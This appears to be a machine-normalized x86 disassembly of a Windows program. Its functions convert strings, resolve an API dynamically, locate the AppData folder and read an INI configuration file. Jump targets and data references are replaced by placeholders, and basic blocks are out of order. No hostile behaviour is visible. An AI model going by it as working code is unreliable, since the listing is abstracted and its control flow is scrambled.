push sub_42a6d8
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
lea esi [ ebp + 0x8 ]
cmp [ ebp + 0x1c ] 0x8
cmovae esi [ ebp + 0x8 ]
mov eax esi
lea edx [ eax + 0x2 ]
nop [ eax ] eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
sub eax edx
sar eax 0x1
push eax
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov ebx eax
lea ecx [ ebx + 0x1 ]
push ecx
call sub_40d84f
mov edx esi
mov edi eax
add esp 0x4
lea eax [ edx + 0x2 ]
nop [ eax + eax ] eax
mov cx [ edx ]
add edx 0x2
test cx cx
jne r-xdata
push 0x0
push 0x0
push ebx
push edi
sub edx eax
sar edx 0x1
push edx
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov [ edi + ebx ] 0x0
mov eax [ ebp + 0x1c ]
cmp eax 0x8
jb r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
lea ecx [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_40bc80
sub_4086a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a718
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx edx
mov esi ecx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x48 ] 0x0
sub esp 0x18
mov [ ebp - 0x4 ] 0x0
mov ecx esp
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx edx
lea edi [ ecx + 0x1 ]
nop [ eax + eax ] ax
xor ecx ecx
jmp r-xdata
xor edx edx
push 0xffffffff
mov [ eax ] dx
lea eax [ ebp + 0x8 ]
push edx
push eax
call sub_40b050
call sub_4085d0
mov edx eax
mov [ ebp - 0x2c ] 0xf
add esp 0x18
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
cmp [ edx ] 0x0
jne r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
push ecx
push edx
lea ecx [ ebp - 0x40 ]
call sub_406a90
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x28 ]
push 0x0
push r--data
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_406a90
mov [ ebp - 0x4 ] 0x2
cmp ebx 0xa
je r-xdata
push 0x5
push r--data
lea eax [ ebx - 0xb ]
cmp eax 0x1
ja r-xdata
push edx
cmp edi 0x10
lea eax [ ebp - 0x28 ]
push 0x0
cmovae eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x40 ]
push eax
call sub_40b270
mov edi eax
cmp edi 0xffffffff
jne r-xdata
push eax
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] eax
push r--data
mov [ esi ] al
call sub_406a90
mov eax [ ebp - 0x14 ]
cmp eax 0x10
jb r-xdata
mov edi [ ebp - 0x14 ]
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x18 ]
cmp edi 0x10
push 0x0
cmovae ecx [ ebp - 0x28 ]
push ecx
call sub_40b1e0
add esp 0x8
test eax eax
jne r-xdata
push 0x6
push r--data
jmp r-xdata
push 0x1
push edi
push r--data
lea ecx [ ebp - 0x40 ]
call sub_40b270
mov ecx eax
cmp ecx 0xffffffff
jne r-xdata
cmp ebx 0xa
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
cmp eax 0x10
jb r-xdata
inc eax
lea ecx [ ebp - 0x28 ]
push eax
push [ ebp - 0x28 ]
call sub_406f10
lea ecx [ ebp - 0x28 ]
call sub_406a90
mov eax [ ebp - 0x18 ]
sub ecx eax
sub ecx edi
add eax edi
push ecx
push eax
push esi
lea ecx [ ebp - 0x40 ]
call sub_409d20
cmp edi eax
je r-xdata
lea eax [ ebp - 0x40 ]
mov ecx esi
push eax
call sub_409de0
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
cmp ecx 0x8
jb r-xdata
inc eax
lea ecx [ ebp - 0x40 ]
push eax
push [ ebp - 0x40 ]
call sub_406f10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0xf
cmp eax 0x10
jb r-xdata
inc eax
lea ecx [ ebp - 0x28 ]
push eax
push [ ebp - 0x28 ]
call sub_406f10
push r--data
mov ecx esi
call sub_4067f0
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
sub eax ecx
sub eax edi
push eax
lea eax [ ecx + edi ]
push eax
push esi
lea ecx [ ebp - 0x40 ]
call sub_409d20
mov eax [ ebp - 0x14 ]
cmp eax 0x10
jb r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
inc ecx
push ecx
jmp r-xdata
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0xf
cmp eax 0x8
jb r-xdata
inc eax
lea ecx [ ebp - 0x40 ]
push eax
push [ ebp - 0x40 ]
call sub_406f10
lea ecx [ ebp - 0x28 ]
call sub_4067b0
lea ecx [ ebp - 0x40 ]
call sub_4067b0
lea ecx [ ebp + 0x8 ]
call sub_409c50
jmp r-xdata
push [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
call sub_40bc80
inc eax
push eax
sub_408960
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov eax [ esi ]
mov [ edi ] eax
lea ecx [ edi + 0x4 ]
lea eax [ esi + 0x4 ]
push eax
call sub_409de0
lea eax [ esi + 0x1c ]
push eax
lea ecx [ edi + 0x1c ]
call sub_409de0
lea eax [ esi + 0x34 ]
push eax
lea ecx [ edi + 0x34 ]
call sub_409de0
lea eax [ esi + 0x4c ]
push eax
lea ecx [ edi + 0x4c ]
call sub_409de0
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
sub_4089b0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a75e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xdc ] 0x0
mov [ ebp - 0x7c ] 0x0
mov [ ebp - 0x64 ] 0xf
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x4c ] 0xf
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
xorps xmm0 xmm0
mov [ ebp - 0x4 ] 0x0
push r--data
movups [ ebp - 0xd8 ] xmm0
call [ LoadLibraryA@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x7c ]
mov [ esi ] eax
lea ecx [ ebp - 0xd8 ]
push ecx
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0xd4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xd0 ]
test eax eax
je r-xdata
sub esp 0x18
mov ecx esp
push eax
call sub_409c90
call sub_4085d0
add esp 0x18
cmp [ edi + 0x14 ] 0x10
jb r-xdata
lea eax [ ebp - 0x7c ]
mov ecx esi
push eax
call sub_408960
jmp r-xdata
cmp [ ebp - 0xcc ] 0x0
jne r-xdata
mov edx eax
mov ecx edi
call sub_4075f0
push eax
lea eax [ ebp - 0x94 ]
push eax
call sub_409a00
push eax
lea ecx [ ebp - 0x30 ]
call sub_409d60
mov eax [ ebp - 0x80 ]
cmp eax 0x10
jb r-xdata
mov edi [ edi ]
lea ecx [ ebp - 0x7c ]
call sub_404250
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
push eax
lea ecx [ ebp - 0x94 ]
call sub_409c90
sub esp 0x18
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x94 ]
mov ecx esp
push eax
call sub_409cf0
mov edx 0xa
lea ecx [ ebp - 0xac ]
call sub_4086a0
push eax
lea ecx [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x2
call sub_40c5d0
add esp 0x1c
lea ecx [ ebp - 0x60 ]
push eax
call sub_409d60
lea ecx [ ebp - 0xc4 ]
call sub_4067b0
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x1
call sub_4067b0
sub esp 0x18
lea eax [ ebp - 0x94 ]
mov ecx esp
push eax
call sub_409cf0
mov edx 0xc
lea ecx [ ebp - 0xac ]
call sub_4086a0
add esp 0x18
lea ecx [ ebp - 0x48 ]
push eax
call sub_409d60
lea ecx [ ebp - 0xac ]
call sub_4067b0
cmp [ ebp - 0x4c ] 0x10
lea ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x50 ]
cmovae ecx [ ebp - 0x60 ]
push 0x0
push ecx
call sub_40b1e0
mov ecx [ ebp - 0x7c ]
add esp 0x8
test eax eax
mov edx 0x1
lea eax [ ebp - 0x7c ]
cmovne ecx edx
mov [ ebp - 0x7c ] ecx
mov ecx esi
push eax
call sub_408960
lea ecx [ ebp - 0x94 ]
call sub_409c50
jmp r-xdata
mov [ ebp - 0x7c ] 0x2
mov [ esi ] 0x2
jmp r-xdata
inc eax
lea ecx [ ebp - 0x94 ]
push eax
push [ ebp - 0x94 ]
call sub_406f10
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ esi + 0x4 ]
call sub_409de0
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ esi + 0x1c ]
call sub_409de0
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ esi + 0x34 ]
call sub_409de0
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ esi + 0x4c ]
call sub_409de0
sub_408c60
push ebp
mov ebp esp
push 0xffffffff
push sub_42a84d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x610
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x560 ] 0x0
mov [ ebp - 0x4f4 ] 0x0
mov [ ebp - 0x4dc ] 0xf
mov [ ebp - 0x4e0 ] 0x0
mov [ ebp - 0x4f0 ] 0x0
mov [ ebp - 0x4c4 ] 0xf
mov [ ebp - 0x4c8 ] 0x0
mov [ ebp - 0x4d8 ] 0x0
mov [ ebp - 0x4ac ] 0xf
mov [ ebp - 0x4b0 ] 0x0
mov [ ebp - 0x4c0 ] 0x0
mov [ ebp - 0x494 ] 0xf
mov [ ebp - 0x498 ] 0x0
mov [ ebp - 0x4a8 ] 0x0
lea eax [ ebp - 0x414 ]
mov [ ebp - 0x4 ] 0x0
push eax
push 0x0
push 0x0
push 0x1a
push 0x0
call [ SHGetFolderPathW@IAT ]
xor eax eax
mov [ ebp - 0x418 ] 0x7
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x42c ] ax
cmp [ ebp - 0x414 ] ax
jne r-xdata
lea ecx [ ebp - 0x414 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x414 ]
push eax
lea ecx [ ebp - 0x42c ]
call sub_40af50
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x42c ]
cmp [ ebp - 0x418 ] 0x8
mov eax [ ebp - 0x41c ]
cmovae ecx [ ebp - 0x42c ]
cmp [ ecx + eax * 2 - 0x2 ] 0x5c
je r-xdata
push 0x10
push r--data
lea ecx [ ebp - 0x42c ]
call sub_40be60
push ecx
lea edx [ ebp - 0x42c ]
lea ecx [ ebp - 0x45c ]
call sub_40c770
add esp 0x4
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x214 ]
cmp [ ebp - 0x448 ] 0x8
lea esi [ ebp - 0x45c ]
push 0x200
cmovae esi [ ebp - 0x45c ]
push 0x0
push eax
call sub_411230
add esp 0xc
lea eax [ ebp - 0x214 ]
push esi
push 0x100
push eax
push r--data
push r--data
push r--data
call [ GetPrivateProfileStringW@IAT ]
test eax eax
jne r-xdata
push 0x1
push r--data
lea ecx [ ebp - 0x42c ]
call sub_40be60
xor eax eax
mov [ ebp - 0x460 ] 0x7
mov [ ebp - 0x464 ] 0x0
mov [ ebp - 0x474 ] ax
cmp [ ebp - 0x214 ] ax
jne r-xdata
mov eax [ ebp - 0x4f4 ]
lea ecx [ ebx + 0x4 ]
mov [ ebx ] eax
lea eax [ ebp - 0x4f0 ]
push eax
call sub_409de0
lea eax [ ebp - 0x4d8 ]
push eax
lea ecx [ ebx + 0x1c ]
call sub_409de0
lea eax [ ebp - 0x4c0 ]
push eax
lea ecx [ ebx + 0x34 ]
call sub_409de0
lea eax [ ebp - 0x4a8 ]
push eax
lea ecx [ ebx + 0x4c ]
call sub_409de0
jmp r-xdata
lea ecx [ ebp - 0x214 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov eax [ ebp - 0x448 ]
cmp eax 0x8
jb r-xdata
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x214 ]
push eax
lea ecx [ ebp - 0x474 ]
call sub_40af50
lea eax [ ebp - 0x474 ]
mov [ ebp - 0x4 ] 0x3
push eax
lea edx [ ebp - 0x42c ]
lea ecx [ ebp - 0x48c ]
call sub_40c840
mov edx eax
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x50c ]
call sub_40c6e0
add esp 0x4
mov esi eax
lea eax [ ebp - 0x42c ]
cmp eax esi
je r-xdata
xor eax eax
mov [ ebp - 0x448 ] 0x7
mov [ ebp - 0x45c ] ax
mov eax [ ebp - 0x418 ]
mov [ ebp - 0x44c ] 0x0
cmp eax 0x8
jb r-xdata
inc eax
lea ecx [ ebp - 0x45c ]
push eax
push [ ebp - 0x45c ]
call sub_40bc80
mov eax [ ebp - 0x4f8 ]
cmp eax 0x8
jb r-xdata
mov eax [ ebp - 0x418 ]
cmp eax 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x418 ] 0x7
lea ecx [ ebp - 0x4f4 ]
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x42c ] ax
call sub_404250
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
inc eax
lea ecx [ ebp - 0x42c ]
push eax
push [ ebp - 0x42c ]
call sub_40bc80
xor eax eax
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x50c ] ax
mov eax [ ebp - 0x478 ]
mov [ ebp - 0x4f8 ] 0x7
mov [ ebp - 0x4fc ] 0x0
cmp eax 0x8
jb r-xdata
inc eax
lea ecx [ ebp - 0x50c ]
push eax
push [ ebp - 0x50c ]
call sub_40bc80
xor eax eax
mov [ ebp - 0x418 ] 0x7
push esi
lea ecx [ ebp - 0x42c ]
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x42c ] ax
call sub_40b170
inc eax
lea ecx [ ebp - 0x42c ]
push eax
push [ ebp - 0x42c ]
call sub_40bc80
push 0x1
push 0x40
push 0x1
sub esp 0x18
mov ecx esp
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
inc eax
lea ecx [ ebp - 0x48c ]
push eax
push [ ebp - 0x48c ]
call sub_40bc80
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
push r--data
call [ OutputDebugStringW@IAT ]
lea ecx [ ebp - 0x60c ]
call sub_40ba90
test eax eax
jne r-xdata
lea edx [ ebp - 0x444 ]
lea ecx [ ebp - 0x61c ]
call sub_40c920
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
test [ ecx + eax + 0xc ] 0x6
jne r-xdata
xor edx edx
push 0xffffffff
mov [ eax ] dx
lea eax [ ebp - 0x42c ]
push edx
push eax
call sub_40b050
call sub_4085d0
add esp 0x18
lea ecx [ ebp - 0x61c ]
push eax
call sub_409e60
mov [ ebp - 0x430 ] 0xf
mov [ ebp - 0x434 ] 0x0
mov [ ebp - 0x444 ] 0x0
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x61c ]
mov eax [ eax + 0x4 ]
test [ ebp + eax - 0x610 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4f4 ]
mov [ ebx ] eax
mov eax [ ebp - 0x61c ]
lea ecx [ ebp - 0x61c ]
mov eax [ eax + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x2
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x4f4 ] 0x8
mov [ ebx ] 0x8
jmp r-xdata
push 0x29
push 0x0
push r--data
lea ecx [ ebp - 0x444 ]
call sub_40b270
cmp eax 0xffffffff
je r-xdata
lea ecx [ ebp - 0x61c ]
mov [ ebp - 0x430 ] 0xf
mov [ ebp - 0x434 ] 0x0
mov [ ebp - 0x444 ] 0x0
call sub_4097d0
mov eax [ ebp - 0x460 ]
cmp eax 0x8
jb r-xdata
inc eax
lea ecx [ ebp - 0x444 ]
push eax
push [ ebp - 0x444 ]
call sub_406f10
push 0x0
push eax
call sub_4082b0
or eax 0x4
lea eax [ ebp - 0x4f0 ]
push eax
lea ecx [ ebx + 0x4 ]
call sub_409de0
lea eax [ ebp - 0x4d8 ]
push eax
lea ecx [ ebx + 0x1c ]
call sub_409de0
lea eax [ ebp - 0x4c0 ]
push eax
lea ecx [ ebx + 0x34 ]
call sub_409de0
lea eax [ ebp - 0x4a8 ]
push eax
lea ecx [ ebx + 0x4c ]
call sub_409de0
mov eax [ ebp - 0x430 ]
cmp eax 0x10
jb r-xdata
push 0x1f
push 0x0
push r--data
lea ecx [ ebp - 0x444 ]
call sub_40b270
cmp eax 0xffffffff
je r-xdata
sub esp 0x18
mov ecx esp
mov [ ebp - 0x558 ] esp
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
xor eax eax
mov [ ebp - 0x460 ] 0x7
mov [ ebp - 0x474 ] ax
mov [ ebp - 0x464 ] eax
inc eax
lea ecx [ ebp - 0x474 ]
push eax
push [ ebp - 0x474 ]
call sub_40bc80
push 0x1f
push 0x0
push r--data
lea ecx [ ebp - 0x444 ]
call sub_40b270
cmp eax 0xffffffff
je r-xdata
sub esp 0x18
mov ecx esp
mov [ ebp - 0x55c ] esp
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
lea edx [ ebp - 0x444 ]
lea ecx [ ebp - 0x61c ]
call sub_40c920
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
test [ ecx + eax + 0xc ] 0x6
je r-xdata
sub esp 0x18
mov ecx esp
mov [ ebp - 0x55c ] esp
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
push 0x29
push r--data
mov [ eax ] 0x0
call sub_406a90
sub esp 0x18
mov [ ebp - 0x4 ] 0x8
mov ecx esp
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
push 0x1f
push r--data
mov [ eax ] 0x0
call sub_406a90
sub esp 0x18
mov [ ebp - 0x4 ] 0xb
mov ecx esp
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x478 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0x4dc ]
cmp eax 0x10
jb r-xdata
push 0xffffffff
mov [ eax ] 0x0
lea eax [ ebp - 0x444 ]
push 0x0
push eax
call sub_406b90
lea eax [ ebp - 0x48c ]
mov [ ebp - 0x4 ] 0x7
push eax
call sub_409860
mov esi eax
lea eax [ ebp - 0x4f0 ]
cmp eax esi
je r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
push 0x1f
push r--data
mov [ eax ] 0x0
call sub_406a90
sub esp 0x18
mov [ ebp - 0x4 ] 0x12
mov ecx esp
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x478 ]
cmp eax 0x10
jb r-xdata
sub esp 0x18
mov ecx esp
mov [ ebp - 0x55c ] esp
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
push 0xffffffff
mov [ eax ] 0x0
lea eax [ ebp - 0x444 ]
push 0x0
push eax
call sub_406b90
lea eax [ ebp - 0x48c ]
mov [ ebp - 0x4 ] 0x7
push eax
call sub_409860
lea edx [ ebp - 0x444 ]
mov [ ebp - 0x4 ] 0xc
lea ecx [ ebp - 0x61c ]
call sub_40c920
push 0x24
push 0x0
push r--data
lea ecx [ ebp - 0x444 ]
call sub_40b270
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x4dc ] 0x10
lea edx [ ebp - 0x4f0 ]
cmovae edx [ ebp - 0x4f0 ]
cmp [ edi + 0x14 ] 0x10
jb r-xdata
inc eax
lea ecx [ ebp - 0x48c ]
push eax
push [ ebp - 0x48c ]
call sub_406f10
push esi
lea ecx [ ebp - 0x4f0 ]
mov [ ebp - 0x4dc ] 0xf
mov [ ebp - 0x4e0 ] 0x0
mov [ ebp - 0x4f0 ] 0x0
call sub_40b670
inc eax
lea ecx [ ebp - 0x4f0 ]
push eax
push [ ebp - 0x4f0 ]
call sub_406f10
push eax
call sub_4160cc
mov [ ebp - 0x4f4 ] eax
add esp 0x4
mov eax [ ebp - 0x510 ]
cmp eax 0x10
jb r-xdata
mov eax [ eax ]
push 0xffffffff
mov [ eax ] 0x0
lea eax [ ebp - 0x444 ]
push 0x0
push eax
call sub_406b90
lea eax [ ebp - 0x524 ]
mov [ ebp - 0x4 ] 0x7
push eax
call sub_409860
cmp [ eax + 0x14 ] 0x10
jb r-xdata
inc eax
lea ecx [ ebp - 0x48c ]
push eax
push [ ebp - 0x48c ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
inc eax
lea ecx [ ebp - 0x524 ]
push eax
push [ ebp - 0x524 ]
call sub_406f10
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
push 0x24
push r--data
mov [ eax ] 0x0
call sub_406a90
sub esp 0x18
mov [ ebp - 0x4 ] 0xd
mov ecx esp
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp - 0x494 ]
cmp eax 0x10
jb r-xdata
call sub_4075f0
push eax
lea eax [ ebp - 0x48c ]
push eax
call sub_409a00
mov esi eax
lea eax [ ebp - 0x4a8 ]
cmp eax esi
je r-xdata
mov eax [ ebp - 0x4f8 ]
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0x4c4 ]
cmp eax 0x10
jb r-xdata
push 0xffffffff
mov [ eax ] 0x0
lea eax [ ebp - 0x444 ]
push 0x0
push eax
call sub_406b90
lea eax [ ebp - 0x524 ]
mov [ ebp - 0x4 ] 0xc
push eax
call sub_409860
mov esi eax
lea eax [ ebp - 0x48c ]
mov [ ebp - 0x4 ] 0xe
push eax
lea ecx [ ebp - 0x554 ]
call sub_40c600
mov edx eax
mov [ ebp - 0x4 ] 0xf
lea ecx [ ebp - 0x53c ]
call sub_40c9d0
add esp 0x4
push esi
mov edx eax
mov [ ebp - 0x4 ] 0x10
lea ecx [ ebp - 0x50c ]
call sub_40ca00
add esp 0x4
mov esi eax
lea eax [ ebp - 0x4d8 ]
cmp eax esi
je r-xdata
push esi
lea ecx [ ebp - 0x4a8 ]
mov [ ebp - 0x494 ] 0xf
mov [ ebp - 0x498 ] 0x0
mov [ ebp - 0x4a8 ] 0x0
call sub_40b670
inc eax
lea ecx [ ebp - 0x4a8 ]
push eax
push [ ebp - 0x4a8 ]
call sub_406f10
mov eax [ ebp - 0x528 ]
mov [ ebp - 0x4f8 ] 0xf
mov [ ebp - 0x4fc ] 0x0
mov [ ebp - 0x50c ] 0x0
cmp eax 0x10
jb r-xdata
inc eax
lea ecx [ ebp - 0x50c ]
push eax
push [ ebp - 0x50c ]
call sub_406f10
push esi
lea ecx [ ebp - 0x4d8 ]
mov [ ebp - 0x4c4 ] 0xf
mov [ ebp - 0x4c8 ] 0x0
mov [ ebp - 0x4d8 ] 0x0
call sub_40b670
inc eax
lea ecx [ ebp - 0x4d8 ]
push eax
push [ ebp - 0x4d8 ]
call sub_406f10
mov eax [ ebp - 0x540 ]
mov [ ebp - 0x528 ] 0xf
mov [ ebp - 0x52c ] 0x0
mov [ ebp - 0x53c ] 0x0
cmp eax 0x10
jb r-xdata
inc eax
lea ecx [ ebp - 0x53c ]
push eax
push [ ebp - 0x53c ]
call sub_406f10
mov eax [ ebp - 0x510 ]
mov [ ebp - 0x540 ] 0xf
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x554 ] 0x0
cmp eax 0x10
jb r-xdata
inc eax
lea ecx [ ebp - 0x554 ]
push eax
push [ ebp - 0x554 ]
call sub_406f10
inc eax
lea ecx [ ebp - 0x524 ]
push eax
push [ ebp - 0x524 ]
call sub_406f10
jmp r-xdata
sub_4097d0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a886
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx ]
lea esi [ ecx + 0x70 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x70 ] r--data
mov eax [ esi - 0x70 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x70 ]
mov [ ecx + esi - 0x74 ] eax
lea ecx [ esi - 0x60 ]
call sub_40a850
mov eax [ esi - 0x70 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x70 ] r--data
mov eax [ esi - 0x70 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x18 ]
mov [ ecx + esi - 0x74 ] eax
mov [ ebp - 0x4 ] 0x0
push esi
mov [ esi ] r--data
call sub_40ec95
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_409860
push ebp
mov ebp esp
push 0xffffffff
push sub_42a8e5
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
